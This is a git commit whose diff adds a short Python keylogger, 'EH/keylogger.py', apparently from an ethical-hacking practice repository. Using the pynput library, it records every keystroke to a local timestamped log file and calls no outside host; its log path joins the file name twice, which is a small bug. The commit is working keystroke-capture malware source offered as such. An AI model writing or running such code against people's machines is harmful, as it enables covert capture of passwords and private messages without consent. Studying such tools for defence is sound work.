ca0c1ff1b0b7e42cbe22fc8ca074c732be1fc88d
habiba Siddiqui <siddiquiummehabiba41@gmail.com>
2026-07-02 10:21:06 +0530

    Add keylogger functionality with pynput
    Implement a keylogger using pynput to log keystrokes.

--- EH/keylogger.py
+++ EH/keylogger.py
@@ -1,1 +1,11 @@
+from pynput.keyboard import Key,Listener
+import logging
+log_dir = "keylog.txt"
+logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG,
+                    format="%(asctime)s: %(message)s")
 
+def on_press(key):
+    logging.info(str(key))
+    
+with Listener(on_press=on_press) as Listener:
+    Listener.join()
